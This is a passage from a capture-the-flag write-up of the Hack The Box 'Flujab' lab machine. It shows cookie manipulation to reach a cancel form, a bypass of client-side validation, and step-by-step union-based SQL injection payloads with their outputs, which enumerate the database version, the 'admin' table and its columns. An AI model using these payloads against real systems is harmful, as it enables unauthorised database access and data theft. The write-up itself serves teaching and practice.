&lt;h4 id=&quot;note--i-checked-whitelist-again-and-my-ip-was-added-there-after-i-added-it-in-the-smtp-server-configuration&quot;&gt;Note : I checked &lt;code class=&quot;highlighter-rouge&quot;&gt;/?whitelist&lt;/code&gt; again and my ip was added there after I added it in the &lt;code class=&quot;highlighter-rouge&quot;&gt;smtp&lt;/code&gt; server configuration&lt;/h4&gt;
&lt;h4 id=&quot;in-the-patients-section-there-were-some-pages-to-book-an-appointment-book-send-a-reminder-remind-or-to-cancel-an-appointment-cancel-to-book-an-appointment-we-need-a-valid-patients-name-after-some-enumeration-i-found-some-names-in-info-&quot;&gt;In the patients section there were some pages to book an appointment (&lt;code class=&quot;highlighter-rouge&quot;&gt;/?book&lt;/code&gt;), send a reminder (&lt;code class=&quot;highlighter-rouge&quot;&gt;/?remind&lt;/code&gt;) or to cancel an appointment (&lt;code class=&quot;highlighter-rouge&quot;&gt;/?cancel&lt;/code&gt;). To book an appointment we need a valid patient’s name. After some enumeration I found some names in &lt;code class=&quot;highlighter-rouge&quot;&gt;/?info&lt;/code&gt; :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/flujab/43.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;i-took-b-smith-and-after-some-guesses-i-got-the-right-name-which-was-bob-smith-&quot;&gt;I took B. Smith and after some guesses I got the right name which was Bob Smith :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/flujab/44.png&quot; alt=&quot;&quot; /&gt;
&lt;br /&gt;
&lt;br /&gt;
&lt;img src=&quot;/images/hackthebox/flujab/45.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;the-email-was-sent-and-we-can-see-that-in-the-python-smtp-server-&quot;&gt;The email was sent and we can see that in the python &lt;code class=&quot;highlighter-rouge&quot;&gt;smtp&lt;/code&gt; server :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/flujab/46.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;---------- MESSAGE FOLLOWS ----------                                                                                                       
Date: Thu, 13 Jun 2019 14:47:23 +0100                                                                                                       
To: bobsmith1975@gmail.com                                                                                                                  
From: Nurse Julie &amp;lt;DutyNurse@flujab.htb&amp;gt;
Subject: Flu Jab Appointment - Ref:NHS-943-475-5911
Message-ID: &amp;lt;e1f9b14325c78abda96f5dd82694b7a4@freeflujab.htb&amp;gt;
X-Mailer: PHPMailer 5.2.22 (https://github.com/PHPMailer/PHPMailer)
MIME-Version: 1.0
Content-Type: text/plain; charset=iso-8859-1
X-Peer: 10.10.10.124



  Dear Mr Bob Smith,

  Here are the details of your appointment at our surgery.
  ________________________

    VACCINATION
    Routine Priority
    ------------------
    REF    : NHS-943-475-5911
    Code   : Influ-022
    Type   : Injection
    Time   : 09:00
    Date   : 2018-11-30
    LOC    : Crick026
  ________________________

  We look forward to seeing you.
  Have a nice day,

  Nurse Julie Walters
  Senior Staff Nurse
  Cricklestone Doctors Surgery
  NHS England.


------------ END MESSAGE ------------
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;i-tried-to-go-to-cancel-&quot;&gt;I tried to go to &lt;code class=&quot;highlighter-rouge&quot;&gt;/?cancel&lt;/code&gt; :&lt;/h4&gt;
&lt;h4 id=&quot;request--3&quot;&gt;Request :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/flujab/47.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;GET /?cancel HTTP/1.1
Host: freeflujab.htb
User-Agent: Mozilla/5.0 (X11; Linux i686; rv:60.0) Gecko/20100101 Firefox/60.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Cookie: Modus=Q29uZmlndXJlPVRydWU%3d; Patient=f991b5fb6a2939471c7230b2db78225e; Registered=Zjk5MWI1ZmI2YTI5Mzk0NzFjNzIzMGIyZGI3ODIyNWU9VHJ1ZQo%3d
Connection: close
Upgrade-Insecure-Requests: 1
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;response--2&quot;&gt;Response :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/flujab/48.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;
HTTP/1.1 302 Found
Date: Thu, 13 Jun 2019 13:50:05 GMT
Content-Type: text/html; charset=UTF-8
Connection: close
Location: /?ERROR=NOT_REGISTERED
Server: ClownWare Proxy
Content-Length: 2060
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;it-redirected-me-to-errornot_registered-i-looked-at-the-older-requests-and-i-noticed-the-set-cookie-headers-&quot;&gt;It redirected me to &lt;code class=&quot;highlighter-rouge&quot;&gt;/?ERROR=NOT_REGISTERED&lt;/code&gt;. I looked at the older requests and I noticed the &lt;code class=&quot;highlighter-rouge&quot;&gt;Set-Cookie&lt;/code&gt; headers :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/flujab/49.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;so-i-added-the-info-about-expiration-max-age-and-path-to-my-cookies-and-tried-again-&quot;&gt;So I added the info about expiration, max age and path to my cookies and tried again :&lt;/h4&gt;
&lt;h4 id=&quot;request--4&quot;&gt;Request :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/flujab/50.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;GET /?cancel HTTP/1.1
Host: freeflujab.htb
User-Agent: Mozilla/5.0 (X11; Linux i686; rv:60.0) Gecko/20100101 Firefox/60.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Cookie: Modus=Q29uZmlndXJlPVRydWU%3d; expires=Thu, 13-Jun-2019 14:04:38 GMT; Max-Age=3600; path=/?smtp_config; Patient=f991b5fb6a2939471c7230b2db78225e; Registered=Zjk5MWI1ZmI2YTI5Mzk0NzFjNzIzMGIyZGI3ODIyNWU9VHJ1ZQ%3D%3D; expires=Thu, 13-Jun-2019 14:04:38 GMT; Max-Age=3600; path=/
Connection: close
Upgrade-Insecure-Requests: 1
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;response--3&quot;&gt;Response :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/flujab/51.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;HTTP/1.1 200 OK
Date: Thu, 13 Jun 2019 13:58:23 GMT
Content-Type: text/html; charset=UTF-8
Connection: close
Server: ClownWare Proxy
Content-Length: 5128
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/flujab/52.png&quot; alt=&quot;&quot; /&gt;
&lt;br /&gt;
&lt;br /&gt;
&lt;img src=&quot;/images/hackthebox/flujab/53.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;to-cancel-an-appointment-we-need-to-provide-the-nhs-number-of-the-patient-however-like-on-the-smtp-configuration-page-it-used-client-side-validation-check-&quot;&gt;To cancel an appointment we need to provide the NHS number of the patient. However like on the &lt;code class=&quot;highlighter-rouge&quot;&gt;smtp&lt;/code&gt; configuration page it used client-side validation check :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/flujab/54.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&amp;lt;input type=&quot;text&quot; name=&quot;nhsnum&quot; placeholder=&quot;NHS Number Required&quot; pattern=&quot;NHS-\d{3}-\d{3}-\d{4}&quot; title=&quot; A Valid NHS Number Is Required e.g. NHS-012-345-6789&quot; required&amp;gt;&amp;lt;/br&amp;gt;
  &amp;lt;ul class=&quot;actions&quot;&amp;gt;
    &amp;lt;center&amp;gt;&amp;lt;input type=&quot;submit&quot; class=&quot;style1&quot; value=&quot;Cancel Appointment&quot; name=&quot;submit&quot; /&amp;gt;&amp;lt;/center&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/flujab/55.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;request--5&quot;&gt;Request :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/flujab/56.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;POST /?cancel HTTP/1.1
Host: freeflujab.htb
User-Agent: Mozilla/5.0 (X11; Linux i686; rv:60.0) Gecko/20100101 Firefox/60.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://freeflujab.htb/?cancel
Content-Type: application/x-www-form-urlencoded
Content-Length: 65
Cookie: Modus=Q29uZmlndXJlPVRydWU%3d; expires=Thu, 13-Jun-2019 14:04:38 GMT; Max-Age=3600; path=/?smtp_config; Patient=f991b5fb6a2939471c7230b2db78225e; Registered=Zjk5MWI1ZmI2YTI5Mzk0NzFjNzIzMGIyZGI3ODIyNWU9VHJ1ZQ%3D%3D; expires=Thu, 13-Jun-2019 14:04:38 GMT; Max-Age=3600; path=/
Connection: close
Upgrade-Insecure-Requests: 1

nhsnum=test&amp;amp;submit=Cancel+Appointment&amp;amp;submit=Cancel+Appointment
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;response--4&quot;&gt;Response :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/flujab/57.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;HTTP/1.1 200 OK
Date: Thu, 13 Jun 2019 14:13:42 GMT
Content-Type: text/html; charset=UTF-8
Connection: close
Server: ClownWare Proxy
Content-Length: 5204
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;now-if-we-check-the-smtp-server-we-can-see-that-the-cancellation-email-was-sent-successfully-&quot;&gt;Now if we check the &lt;code class=&quot;highlighter-rouge&quot;&gt;smtp&lt;/code&gt; server we can see that the cancellation email was sent successfully :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/flujab/58.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;---------- MESSAGE FOLLOWS ----------
Date: Thu, 13 Jun 2019 15:13:40 +0100
To: cancelations@no-reply.flujab.htb
From: Nurse Julie Walters &amp;lt;DutyNurse@flujab.htb&amp;gt;
Subject: Flu Jab Appointment - Ref:
Message-ID: &amp;lt;219504b93c84fb0e94fef1ae3d31707d@freeflujab.htb&amp;gt;
X-Mailer: PHPMailer 5.2.22 (https://github.com/PHPMailer/PHPMailer)
MIME-Version: 1.0
Content-Type: text/plain; charset=iso-8859-1
X-Peer: 10.10.10.124

    CANCELLATION NOTICE!
  ________________________

    VACCINATION
    Routine Priority
    ------------------
    REF    : test
    Code   : Influ-022
    Type   : Injection
    Stat   : CANCELED
    LOC    : Crick026
  ________________________

  Your flu jab appointment has been canceled.
  Have a nice day,

  Nurse Julie Walters
  Senior Staff Nurse
  Cricklestone Doctors Surgery
  NHS England.


------------ END MESSAGE ------------
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
&lt;hr /&gt;

&lt;h3 id=&quot;sqli&quot;&gt;SQLi&lt;/h3&gt;
&lt;h4 id=&quot;i-tried-to-play-around-with-that-input-nhsnum-i-tried-a-lot-of-stuff-and-when-i-tried-union-based-sql-injection-i-got-a-hit-a-good-reference&quot;&gt;I tried to play around with that input (&lt;code class=&quot;highlighter-rouge&quot;&gt;nhsnum&lt;/code&gt;), I tried a lot of stuff and when I tried union based &lt;code class=&quot;highlighter-rouge&quot;&gt;sql&lt;/code&gt; injection I got a hit (a good &lt;a href=&quot;http://www.securityidiots.com/Web-Pentest/SQL-Injection/Basic-Union-Based-SQL-Injection.html&quot;&gt;reference&lt;/a&gt;):&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/flujab/59.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;nhsnum=' UNION SELECT 1,2,@@datadir,4,5;#&amp;amp;submit=Cancel+Appointment&amp;amp;submit=Cancel+Appointment
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;this-payload-prints-the-data-directory&quot;&gt;This payload prints the data directory.&lt;/h4&gt;
&lt;h4 id=&quot;smtp-&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;smtp&lt;/code&gt; :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/flujab/60.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;---------- MESSAGE FOLLOWS ----------
Date: Thu, 13 Jun 2019 15:20:32 +0100
To: cancelations@no-reply.flujab.htb
From: Nurse Julie Walters &amp;lt;DutyNurse@flujab.htb&amp;gt;
Subject: Flu Jab Appointment - Ref:/var/lib/mysql/
Message-ID: &amp;lt;9bcabe79f1782598002cc31abc3bb333@freeflujab.htb&amp;gt;
X-Mailer: PHPMailer 5.2.22 (https://github.com/PHPMailer/PHPMailer)
MIME-Version: 1.0
Content-Type: text/plain; charset=iso-8859-1
X-Peer: 10.10.10.124

    CANCELLATION NOTICE!
  ________________________

    VACCINATION
    Routine Priority
    ------------------
    REF    : ' UNION SELECT 1,2,@@datadir,4,5;#
    Code   : Influ-022
    Type   : Injection
    Stat   : CANCELED
    LOC    : Crick026
  ________________________

  Your flu jab appointment has been canceled.
  Have a nice day,

  Nurse Julie Walters
  Senior Staff Nurse
  Cricklestone Doctors Surgery
  NHS England.


------------ END MESSAGE ------------
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;database-version-&quot;&gt;Database version :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/flujab/61.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;nhsnum=' UNION SELECT 1,2,@@version,4,5;#&amp;amp;submit=Cancel+Appointment&amp;amp;submit=Cancel+Appointment
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;smtp--1&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;smtp&lt;/code&gt; :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/flujab/62.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;---------- MESSAGE FOLLOWS ----------
Date: Thu, 13 Jun 2019 15:24:50 +0100
To: cancelations@no-reply.flujab.htb
From: Nurse Julie Walters &amp;lt;DutyNurse@flujab.htb&amp;gt;
Subject: Flu Jab Appointment - Ref:10.1.37-MariaDB-0+deb9u1
Message-ID: &amp;lt;d2e238de2ef64c5dd385e30472c94d5e@freeflujab.htb&amp;gt;
X-Mailer: PHPMailer 5.2.22 (https://github.com/PHPMailer/PHPMailer)
MIME-Version: 1.0
Content-Type: text/plain; charset=iso-8859-1
X-Peer: 10.10.10.124

    CANCELLATION NOTICE!
  ________________________

    VACCINATION
    Routine Priority
    ------------------
    REF    : ' UNION SELECT 1,2,@@version,4,5;#
    Code   : Influ-022
    Type   : Injection
    Stat   : CANCELED
    LOC    : Crick026
  ________________________

  Your flu jab appointment has been canceled.
  Have a nice day,

  Nurse Julie Walters
  Senior Staff Nurse
  Cricklestone Doctors Surgery
  NHS England.


------------ END MESSAGE ------------
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;great-lets-get-the-table-name-&quot;&gt;Great. Let’s get the table name :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/flujab/63.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;nhsnum=' UNION SELECT 1,2,table_name,4,5 from information_schema.tables where table_schema=database()--+&amp;amp;submit=Cancel+Appointment&amp;amp;submit=Cancel+Appointment
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;smtp--2&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;smtp&lt;/code&gt; :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/flujab/64.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;---------- MESSAGE FOLLOWS ----------
Date: Thu, 13 Jun 2019 15:28:15 +0100
To: cancelations@no-reply.flujab.htb
From: Nurse Julie Walters &amp;lt;DutyNurse@flujab.htb&amp;gt;
Subject: Flu Jab Appointment - Ref:admin
Message-ID: &amp;lt;e389b6f96e0104edf7b12bd167666fb3@freeflujab.htb&amp;gt;
X-Mailer: PHPMailer 5.2.22 (https://github.com/PHPMailer/PHPMailer)
MIME-Version: 1.0
Content-Type: text/plain; charset=iso-8859-1
X-Peer: 10.10.10.124

    CANCELLATION NOTICE!
  ________________________

    VACCINATION
    Routine Priority
    ------------------
    REF    : ' UNION SELECT 1,2,table_name,4,5 from information_schema.tables where table_schema=database()--                              
    Code   : Influ-022
    Type   : Injection
    Stat   : CANCELED
    LOC    : Crick026
  ________________________

  Your flu jab appointment has been canceled.
  Have a nice day,

  Nurse Julie Walters
  Senior Staff Nurse
  Cricklestone Doctors Surgery
  NHS England.


------------ END MESSAGE ------------
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;table-name-is-admin-lets-get-the-column-names-&quot;&gt;Table name is &lt;code class=&quot;highlighter-rouge&quot;&gt;admin&lt;/code&gt; let’s get the column names :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/flujab/65.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;nhsnum=' UNION SELECT 1,2,column_name,4,5 from information_schema.columns where table_schema=database() and table_name='admin'--+&amp;amp;submit=Cancel+Appointment&amp;amp;submit=Cancel+Appointment
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;smtp--3&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;smtp&lt;/code&gt; :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/flujab/66.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;---------- MESSAGE FOLLOWS ----------
Date: Thu, 13 Jun 2019 15:38:55 +0100
To: cancelations@no-reply.flujab.htb
From: Nurse Julie Walters &amp;lt;DutyNurse@flujab.htb&amp;gt;
Subject: Flu Jab Appointment - Ref:id
Message-ID: &amp;lt;50be6357006cbedc546152de64cd5407@freeflujab.htb&amp;gt;
X-Mailer: PHPMailer 5.2.22 (https://github.com/PHPMailer/PHPMailer)
MIME-Version: 1.0
Content-Type: text/plain; charset=iso-8859-1
X-Peer: 10.10.10.124

    CANCELLATION NOTICE!
  ________________________

    VACCINATION
    Routine Priority
    ------------------
    REF    : ' UNION SELECT 1,2,column_name,4,5 from information_schema.columns where table_schema=database() and table_name='admin'--     
    Code   : Influ-022
    Type   : Injection
    Stat   : CANCELED
    LOC    : Crick026
  ________________________

  Your flu jab appointment has been canceled.
  Have a nice day,

  Nurse Julie Walters
  Senior Staff Nurse
  Cricklestone Doctors Surgery
  NHS England.


------------ END MESSAGE ------------
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;this-gave-us-the-first-column-name-which-is-id-to-get-the-rest-of-the-column-names-we-will-add-and-column_nameprevious-column-name-here&quot;&gt;This gave us the first column name which is &lt;code class=&quot;highlighter-rouge&quot;&gt;id&lt;/code&gt;, to get the rest of the column names we will add &lt;code class=&quot;highlighter-rouge&quot;&gt;and column_name!='PREVIOUS COLUMN NAME HERE'&lt;/code&gt;.&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/flujab/67.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;nhsnum=' UNION SELECT 1,2,column_name,4,5 from information_schema.columns where table_schema=database() and table_name='admin' and column_name!='id'--+&amp;amp;submit=Cancel+Appointment&amp;amp;submit=Cancel+Appointment
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;smtp--4&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;smtp&lt;/code&gt; :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/flujab/68.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;---------- MESSAGE FOLLOWS ----------
Date: Thu, 13 Jun 2019 15:41:26 +0100
To: cancelations@no-reply.flujab.htb
From: Nurse Julie Walters &amp;lt;DutyNurse@flujab.htb&amp;gt;
Subject: Flu Jab Appointment - Ref:loginname
Message-ID: &amp;lt;3d6a306c2827c5d6b3e44ae2c9602d2e@freeflujab.htb&amp;gt;
X-Mailer: PHPMailer 5.2.22 (https://github.com/PHPMailer/PHPMailer)
MIME-Version: 1.0
Content-Type: text/plain; charset=iso-8859-1
X-Peer: 10.10.10.124

    CANCELLATION NOTICE!
  ________________________

    VACCINATION
    Routine Priority
    ------------------
    REF    : ' UNION SELECT 1,2,column_name,4,5 from information_schema.columns where table_schema=database() and table_name='admin' and column_name!='id'--
    Code   : Influ-022
    Type   : Injection
    Stat   : CANCELED
    LOC    : Crick026
  ________________________

  Your flu jab appointment has been canceled.
  Have a nice day,

  Nurse Julie Walters
  Senior Staff Nurse
  Cricklestone Doctors Surgery
  NHS England.


------------ END MESSAGE ------------
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;second-column--loginname&quot;&gt;Second column : &lt;code class=&quot;highlighter-rouge&quot;&gt;loginname&lt;/code&gt;&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/flujab/69.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;nhsnum=' UNION SELECT 1,2,column_name,4,5 from information_schema.columns where table_schema=database() and table_name='admin' and column_name!='id' and column_name!='loginname'--+&amp;amp;submit=Cancel+Appointment&amp;amp;submit=Cancel+Appointment
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;smtp--5&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;smtp&lt;/code&gt; :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/flujab/70.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;---------- MESSAGE FOLLOWS ----------
Date: Thu, 13 Jun 2019 15:44:08 +0100
To: cancelations@no-reply.flujab.htb
From: Nurse Julie Walters &amp;lt;DutyNurse@flujab.htb&amp;gt;
Subject: Flu Jab Appointment - Ref:namelc
Message-ID: &amp;lt;8a8dbbfb4a4c3a0968c819bc9e188e6c@freeflujab.htb&amp;gt;
X-Mailer: PHPMailer 5.2.22 (https://github.com/PHPMailer/PHPMailer)
MIME-Version: 1.0
Content-Type: text/plain; charset=iso-8859-1
X-Peer: 10.10.10.124

    CANCELLATION NOTICE!
  ________________________

    VACCINATION
    Routine Priority
    ------------------
    REF    : ' UNION SELECT 1,2,column_name,4,5 from information_schema.columns where table_schema=database() and table_name='admin' and column_name!='id' and column_name!='loginname'--
    Code   : Influ-022
    Type   : Injection
    Stat   : CANCELED
    LOC    : Crick026
  ________________________

  Your flu jab appointment has been canceled.
  Have a nice day,

  Nurse Julie Walters
  Senior Staff Nurse
  Cricklestone Doctors Surgery
  NHS England.


------------ END MESSAGE ------------
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;third-column--namelc&quot;&gt;Third column : &lt;code class=&quot;highlighter-rouge&quot;&gt;namelc&lt;/code&gt;&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/flujab/71.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;nhsnum=' UNION SELECT 1,2,column_name,4,5 from information_schema.columns where table_schema=database() and table_name='admin' and column_name!='id' and column_name!='loginname' and column_name!='namelc'--+&amp;amp;submit=Cancel+Appointment&amp;amp;submit=Cancel+Appointment
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;smtp--6&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;smtp&lt;/code&gt; :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/flujab/72.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;---------- MESSAGE FOLLOWS ----------
Date: Thu, 13 Jun 2019 15:46:45 +0100
To: cancelations@no-reply.flujab.htb
From: Nurse Julie Walters &amp;lt;DutyNurse@flujab.htb&amp;gt;
Subject: Flu Jab Appointment - Ref:email
Message-ID: &amp;lt;087443e0a9489da3ec320a89cc3df41b@freeflujab.htb&amp;gt;
X-Mailer: PHPMailer 5.2.22 (https://github.com/PHPMailer/PHPMailer)
MIME-Version: 1.0
Content-Type: text/plain; charset=iso-8859-1
X-Peer: 10.10.10.124

    CANCELLATION NOTICE!
  ________________________

    VACCINATION
    Routine Priority
    ------------------
    REF    : ' UNION SELECT 1,2,column_name,4,5 from information_schema.columns where table_schema=database() and table_name='admin' and column_name!='id' and column_name!='loginname' and column_name!='namelc'--                                                                    
    Code   : Influ-022
    Type   : Injection
    Stat   : CANCELED
    LOC    : Crick026
  ________________________

  Your flu jab appointment has been canceled.
  Have a nice day,

  Nurse Julie Walters
  Senior Staff Nurse
  Cricklestone Doctors Surgery
  NHS England.


